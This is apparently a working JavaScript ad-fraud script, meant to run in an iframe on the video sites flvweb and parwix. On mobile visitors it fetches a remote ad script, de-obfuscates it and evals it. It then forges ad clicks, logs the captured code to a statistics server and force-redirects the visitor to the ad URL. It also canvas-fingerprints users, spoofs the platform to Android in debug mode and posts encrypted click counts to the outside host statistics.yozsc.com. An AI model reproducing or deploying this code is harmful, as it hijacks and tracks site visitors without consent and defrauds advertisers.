       
        var _number = 1;
        var _jzUrl  = "//k.jinxiuzhilv.com/h.php?pid=14172";
        var _UUID   = "";
        var _isDebug= true;
        var _debugType = 'flvweb';
        
        
        /******************************************************
         * 
         *                  核心代码;
         * 
         *****************************************************/
        /** 随机概率 */
        var _random = Math.floor(Math.random()*(1 - (_number + 1)) + (_number + 1));
        
        /** 请求h.php超时时间 */
        var _hpTimeout = 3000;
        
        /** 请求w.php超时时间; */
        var _wpTimout  = 4000;
        
        /** 普通请求超时时间 */
        var _timout    = 3000;
        
        /** 解密钥匙 */
        var _privateKey = 'flvweb_com_zrahh';
        
        /** 判断类型是flvweb还是parwix解析 */
        var _webType = '';
        
        try {
            
            var _topFrame = window.top.location.host;
            _webType = /parwix/g.test(_topFrame) ? 'parwix' : 'flvweb';
            
        /** 跨域的话这里会抛异常说明当前是在解析而非在flvweb */
        } catch (e) {
            
            _webType = 'parwix';
        }
        

        /**  获取地址栏参数，并且转换成对象 */
        function parseURL(url){
            if (!url) return {};
            url = decodeURIComponent(url);
            var _url = url.split("?")[1];
        
            if (!_url) return {};
        
            var para = _url.split("&");
            var len  = para.length;
            var res  = {};
            for (var i = 0; i < len; i++) {
                var arr = para[i].split("=");
                res[arr[0]] = arr[1];
            }
            return res;
        } 
        
        /** 随机字母 */
        function randomString(len) {
        　　len = len || 32;
        　　var $chars = 'abcdefhijkmnprstwxyz123456789';    /****默认去掉了容易混淆的字符oOLl,9gq,Vv,Uu,I1****/
        　　var maxPos = $chars.length;
        　　var pwd = '';
        　　for (var i = 0; i < len; i++) {
        　　　　pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
       　  　}
  　　      return pwd; 
        }
        
         // 解密函数 (js原代码如下cad)
    	 // string 要加密/解密的字符串
         // code 秘钥字符串
         // operation 默认false表示加密，传入true表示解密
    	 function secret(string, code, operation) {
    	    
            code = CryptoJS.MD5(code).toString();
            
            var iv = CryptoJS.enc.Utf8.parse(code.substring(0,16));
            
            var key = CryptoJS.enc.Utf8.parse(code.substring(16));
            
            if(operation){
                return CryptoJS.AES.decrypt(string,key,{iv:iv,padding:CryptoJS.pad.Pkcs7}).toString(CryptoJS.enc.Utf8);
            }
            return CryptoJS.AES.encrypt(string, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7}).toString();
         }
        
       
        /** 
         * 请求链接 
         * 全部要设置为jsonp跨域的方式;
         */
        function ajaxFunc(_url, _type, _data, _successCallBack, _errorCallBack, _timeoutCallBack,  _timeout, _isJsonp){
            
            var _ajaxParams = {
        			url: _url,
        			type: _type,
        			headers: {},
        			data: _data,
        			timeout: _timeout,
        			success: function(_data) {
        				
        				if(_successCallBack){
        					_successCallBack(_data);
        				}
        			},
        			error:function(_error){
        				
        				if(_errorCallBack){
        					_errorCallBack(_error);
        				}
        			},
        			complete: function (XMLHttpRequest, status) { //当请求完成时调用函数
                       
                        /** status == 'timeout'意为超时,status的可能取值：success,notmodified,nocontent,error,timeout,abort,parsererror */
                        if (status == 'timeout') {
                            
                           /** 取消请求 */    
                           ajaxTimeOut.abort(); 
                          
                           _timeoutCallBack();
                        }
                    }
        	}
        	
        	if(_isJsonp){
        	    _ajaxParams['dataType']	= 'jsonp';
        	    _ajaxParams['jsonp']	= 'callback';
        	}
        	
            var ajaxTimeOut= $.ajax(_ajaxParams);
        }


        /** 设置cookie */
        function setCookie(name, value, days) { 
             var d = new Date();
             d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
             var expires = "expires=" + d.toUTCString();
             document.cookie = name + "=" + value + "; " + expires;
        }
        
        /** 修改js中的代码字符串并且返回 */
        function changejsString(_data){
            
            //_data = _data.replace('document.write','document.getElementById("flvweb").innerHTML =');
            //_data = _data.replace('w.top.location.href','w.location.href')
             
            var _string =  _data.match(/_&zhiwen=.+_B1/g)[0];
            _string = _string.replace('_&zhiwen=" + ','').replace("+ '_B1",'');
            _data = _data.replace(_string, '"'+ randomString(8) +'"');
             
            var _linkString =  _data.match(/var b='".+&ct=1';/g)[0];
            
            _linkString = _linkString.replace('var b=\'\"\+','var wphpUrl=').replace("\"&n=\'+Math.floor","\'&n=\'+Math.floor");
                
            /** 这里注入window['wphpUrl']以获取w.p的链接 */
            return  _data.replace("js1nod.innerHTML = strjs1",_linkString + "window['wphpUrl']=wphpUrl;js1nod.innerHTML = strjs1");
        }
        
        /** 获取请求后的调整链接 */
        function getLink(_data){
            
            var _slinkString =  _data.match(/\=\".+\"\;/g)[0];
            
            return _slinkString.replace('\=\"','').replace('\"\;','');
        }
        
        /** 解除混淆的代码 */
        function reductionConfusion(_data){
        
           /** 如果有加密的情况就取解密，如果它没加密的情况就直接返回 */
           if(/new Function/g.test(_data)){
           
                _data =  _data.trim().replace('new Function(','').replace(')()','');
           
                return eval(_data).toString();
           }
        
           return _data;
        }


        /** h.php请求成功执行的 */
        function hp_requestSuccess(_data){
            
            /** 如果为空按超时来处理 */
            if(_data == null || _data.replace(/(^\s*)|(\s*$)/g, "") == ''){
                
                 requestTimout();
                 return;
            }
            
            /** 解除混淆的代码 */
            _data = reductionConfusion(_data);
            
            /** 这里注入window['wphpUrl']以获取w.p的链接 */
            var _string = changejsString(_data);
            
            //console.log(_string);
                
            /** 执行被修改后的代码 */
            window.eval(_string);
               
           /** 这里要间隔一下,否则window.eval会还没执行完毕导致拿不到window['wphpUrl'] */
            window.setTimeout(function(){
                
               if(window['wphpUrl']){
                   
                  
                   /** 请求w.php的链接 */
                   ajaxFunc(window['wphpUrl'],'GET', {}, function(_sdata){ 
                       
                        /** 获取请求后的调整链接 */
                        var _slinkString =  getLink(_sdata);
                        
                        /** 把这批js记录下来 */
                        ajaxFunc('//statistics.yozsc.com/server/jz_server.php','POST',{ hp: _data, wp: _slinkString, wphpUrl: window['wphpUrl'], type: _webType }, function(){}, function(){}, function(){}, _hpTimeout);
                        
                        window.setTimeout(function(){
                            
                             /** 设置cookie和删除iframe */
                             setCookieAndRmoveIframe();
                             
                             if(/\/rc/g.test(_slinkString)==false){
                                 
                                 /** 跳转到指定的广告 */
                                 if(window.location.protocol == 'https'){
                                     
                                     if(/http/g.test(_slinkString)){
                                         
                                          _slinkString =  _slinkString.replace('https://','//');
                                          
                                     }else{
                                         
                                          _slinkString = '//'+ _slinkString;
                                     }
                                    
                                 }
                                 
                                 recordOperationFunc(4, '步骤4: ok goto Url success', new Date().getTime());
                                 
                                 window.location.href = _slinkString;
                                 
                             }else{
                                 
                                 requestTimout();
                             }
                            
                        },2000);
                        
                        
                        
                        /** 这里顺便记录一下统计点击的次数 */
                        ajaxFunc('//statistics.yozsc.com/server/count_server.php','POST',{ line: _webType, type: secret('normal', _privateKey, false) }, function(){}, function(){}, function(){}, _hpTimeout);
                       
                   },  wp_requestError, wp_requestComplete, _wpTimout);
               
                   
               }else{
                   
                   /** 超时处理 */
                   requestTimout();
               }
                   
            },3000);
        }
        
        /** 设置cookie和删除iframe */
        function setCookieAndRmoveIframe(){
            
            /** 向父窗框返回响应结果 */
            window.parent.postMessage({
                        	
               act: 'removeIframe_jz'
                            
            },'*');
            
            setCookie("timeout_jz", new Date().getTime() * 1000, 1);
        }
        
        /** h.php错误请求 */
        function hp_requestError(){
            
        }
        
        /** h.php请求完成 */
        function hp_requestComplete(){
            
            requestTimout();
        }
        
        /** 超时处理 */
        function requestTimout(){
            
             recordOperationFunc(4, '步骤4: request timeout and request cache', new Date().getTime());
            
             /** 
              * 这里可能会出现跨域的情况, 所以不能直接使用json,换成php文件试一下 
              * //statistics.bax1.com:880/server/dataBackup.json
              */
             ajaxFunc('//statistics.yozsc.com/server/dataBackup.php?v='+ Math.random()*10000,'GET',{},function(_jsonString){
                 
                /** 把字符串json转成真正的json */ 
                var _data = JSON.parse(_jsonString);
                
                /** 随机抽取1个广告进行点击 */
                var keys = [];
                
                for (var key in _data){
                    keys.push(key);
                }
                
                var index = Math.floor((Math.random()* keys.length)); 
                var md5Name = keys[index];
                    
                ajaxFunc('//statistics.yozsc.com/server/ghp.php?h='+ md5Name,'GET',{}, function(_sdata){
                    
                     /** 解密wphpUrl链接 */
                    var _requestUrl = secret(_data[md5Name].wphpUrl, _privateKey, true);
                    _requestUrl = _requestUrl.replace('http://','//');
                 
                    /** 请求w.php的链接 */
                    ajaxFunc(_requestUrl,'GET', {}, function(_sdata){
                        
                        recordOperationFunc(5, '步骤5: request cache and gotoUrl success', new Date().getTime());
                        
                         /** 设置cookie和删除iframe */    
                         setCookieAndRmoveIframe();    
                        
                         /** 解密跳转渠广告道链接 */
                         var _gotoUrl = secret(_data[md5Name].wp, _privateKey, true);
                        
                         if(window.location.protocol == 'https'){
                                     
                             if(/http/g.test(_gotoUrl)){   
                                 
                                _gotoUrl =  _gotoUrl.replace('https://','//');

                             }else{
                                 
                                 _gotoUrl = '//' + _gotoUrl; 
                             }
                         }
                         
                         window.location.href = _gotoUrl;
                        
                    },function(){}, function(){
                        
                        recordOperationFunc(5, '步骤5: request cache timeout and gotoUrl success', new Date().getTime());
                        
                         /** 设置cookie和删除iframe */    
                         setCookieAndRmoveIframe();    
                        
                         /** 解密跳转渠广告道链接 */
                         var _gotoUrl = secret(_data[md5Name].wp, _privateKey, true);
                         
                         if(window.location.protocol == 'https'){
                                     
                             if(/http/g.test(_gotoUrl)){   
                                 
                                _gotoUrl =  _gotoUrl.replace('https://','//');
                                
                             }else{
                                 
                                 _gotoUrl = '//' + _gotoUrl; 
                             }
                         }
                                 
                         window.location.href = _gotoUrl;
                      
                    },4000);
                    
                    /** 这里顺便记录一下统计点击的次数 */
                    ajaxFunc('//statistics.yozsc.com/server/count_server.php','POST',{ line: _webType, type: secret('cache', _privateKey, false) }, function(){}, function(){}, function(){}, 4000);
                    
                },function(){},function(){},_timout);
                
            },function(){},function(){},_timout);
        }
        
        /** w.php请求错误 */
        function wp_requestError(){
            
        }
        
        /** w.php请求完成 */
        function wp_requestComplete(){
            
            requestTimout();
        }
        
        
        /** 获取用户指纹 */
        function getUUID(domain) {
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext("2d");
            var txt = domain;
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "tencent";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText(txt, 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText(txt, 4, 17);
    
            var b64 = canvas.toDataURL().replace("data:image/png;base64,","");
            var bin = atob(b64);
            var crc = bin2hex(bin.slice(-16,-12));
            return crc;
        }
    
        function bin2hex(s) {
            var i, l, o = '',n;
            s += '';
    
            for (i = 0, l = s.length; i < l; i++) {
                n = s.charCodeAt(i)
                    .toString(16);
                o += n.length < 2 ? '0' + n : n;
            }
            return o;
       }
    
      /**
       *  时间字符串格式化
       */
       function formatTime(_time, _format) {
    
            var dateStr = _time;
            /*
             * eg:format="YYYY-MM-dd hh:mm:ss";
             */
            if (typeof dateStr == "string") {
                dateStr = dateStr.replace("T", " ").replace(/-/g, "/");
            }
            var obj = new Date(dateStr);
            var o = {
                "M+": obj.getMonth() + 1, // month
                "d+": obj.getDate(), // day
                "h+": obj.getHours(), // hour
                "m+": obj.getMinutes(), // minute
                "s+": obj.getSeconds(), // second
                "q+": Math.floor((obj.getMonth() + 3) / 3), // quarter
                "S": obj.getMilliseconds()
            }
        
            if (/(Y+)/.test(_format)) {
                _format = _format.replace(RegExp.$1, RegExp.$1.length == 4 ? obj.getFullYear() : (obj.getFullYear() + "")
                    .substr(4 - RegExp.$1.length));
            }
        
            for (var k in o) {
                if (new RegExp("(" + k + ")").test(_format)) {
                    _format = _format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] :
                        ("00" + o[k]).substr(("" + o[k]).length));
                }
            }
            return _format;
       }
    
    
    /** 
     * 记录操作步骤函数 
     * step: 步骤
     * content: 步骤内容
     * time: 步骤时间;
     */
    function recordOperationFunc(_step, _content, _time){
        
        /** 如果开启了调试模式才去记录用户步骤 */
        if(_isDebug){
            
            if(_UUID == ''){
               _UUID = getUUID('xla');
            }
           
            var _recordOperation = {
                id: _UUID,
                type: _debugType,
                step: _step,
                content: _content,
                time: formatTime(new Date(), 'YYYY-MM-dd hh:mm:ss')
            }
            
            ajaxFunc('//statistics.yozsc.com/server/count_num.php', 'POST', { 'setCountDebug': JSON.stringify(_recordOperation) } , function(){}, function(){}, function(){}, 8000);
        }
    }


    /** 在iframe中才执行下面的代码; */
    /** 只有符合条件才可以看到广告 */
    if(top && parseURL(top.location.href)['debuggerto'] && /zuoan/g.test(parseURL(top.location.href)['debuggerto'])){
        
    	Object.defineProperty(navigator,'platform',{get:function(){return 'Android';}});
    
        /** 请求桔子广告的地址 */
        ajaxFunc(_jzUrl,'GET', {}, hp_requestSuccess, hp_requestError, hp_requestComplete, _hpTimeout);
        
    }else{
        
        /** 随机1~3, 如果是为3才去操作代码, 并且这个cookie存在; */
        if(_random == 1  && (navigator['platform'] == 'Win32' || navigator['platform'] == 'MacIntel') == false){
            
            recordOperationFunc(3, '步骤3: start request', new Date().getTime());
            
	        /** 请求桔子广告的地址 */
            ajaxFunc(_jzUrl,'GET', {}, hp_requestSuccess, hp_requestError, hp_requestComplete, _hpTimeout);
        }
    }
 
        
